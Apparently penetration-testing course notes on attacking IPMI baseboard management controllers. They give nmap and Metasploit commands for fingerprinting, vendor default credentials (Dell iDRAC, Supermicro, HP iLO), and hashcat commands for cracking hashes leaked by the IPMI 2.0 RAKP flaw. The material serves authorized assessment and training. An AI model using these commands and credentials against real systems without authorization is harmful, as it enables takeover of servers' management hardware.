Systems that use the IPMI protocol are called Baseboard Management Controllers (BMCs). If we can access a BMC during an assessment, we would gain full access to the host motherboard and be able to monitor, reboot, power off, or even reinstall the host operating system.
# Footprinting the Service
```
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```
```
use auxiliary/scanner/ipmi/ipmi_version
```
We often find BMCs where the administrators have not changed the default password. Some unique default passwords to keep in our cheatsheets include
- Dell iDRAC   
```
root:calvin    
```
- HP iLO
```
Administrator:randomized 8-character using consisting of numbers and uppercase letters
```
- Supermicro IPMI
```
ADMIN:ADMIN
```
# Dangerous Settings
If default credentials do not work to access a BMC, we can turn to a flaw in the RAKP protocol in IPMI 2.0. During the authentication process, the server sends a salted SHA1 or MD5 hash of the user's password to the client before authentication takes place. This can be leveraged to obtain the password hash for ANY valid user account on the BMC. These password hashes can then be cracked offline using a dictionary attack using Hashcat mode 7300.

In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command which tries all combinations of upper case letters and numbers for an eight-character password.
```
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

To retrieve IPMI hashes, we can use the Metasploit IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval module.
```
use auxiliary/scanner/ipmi/ipmi_dumphashes
```
```
hashcat -m 7300 ipmi.txt /usr/share/wordlists/rockyou.txt
```
